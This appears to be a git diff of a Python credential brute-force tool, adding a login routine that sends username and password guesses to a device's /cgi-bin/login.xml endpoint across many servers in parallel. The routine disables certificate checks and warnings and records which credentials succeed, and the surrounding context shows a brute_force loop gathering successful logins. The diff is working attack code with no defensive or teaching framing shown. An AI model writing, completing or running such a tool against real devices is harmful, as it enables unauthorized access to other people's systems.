@@ -1,6 +1,8 @@
 #! /usr/bin/env python3
 
+import requests, warnings
 from datetime import date
+from urllib.parse import quote
 from optparse import OptionParser
 from colorama import Fore, Back, Style
 from multiprocessing import Lock, Pool, cpu_count
@@ -17,6 +19,7 @@ status_color = {
 scheme = "http"
 lock = Lock()
 thread_count = cpu_count()
+warnings.filterwarnings('ignore')
 
 def display(status, data, start='', end='\n'):
     print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
@@ -28,7 +31,15 @@ def get_arguments(*args):
     return parser.parse_args()[0]
 
 def login(server, username='admin', password='password', scheme="http", timeout=None):
-    pass
+    t1 = time()
+    try:
+        response = requests.get(f"{scheme}://{server}/cgi-bin/login.xml?username={quote(username)}&password={quote(password)}", verify=False, timeout=timeout)
+        authorization_status = True if response.status_code // 100 == 2 and "fail" not in response.text.lower() else False
+        t2 = time()
+        return authorization_status, t2-t1
+    except Exception as error:
+        t2 = time()
+        return error, t2-t1
 def brute_force(thread_index, servers, credentials, scheme="http", timeout=None):
     successful_logins = {}
     for credential in credentials:
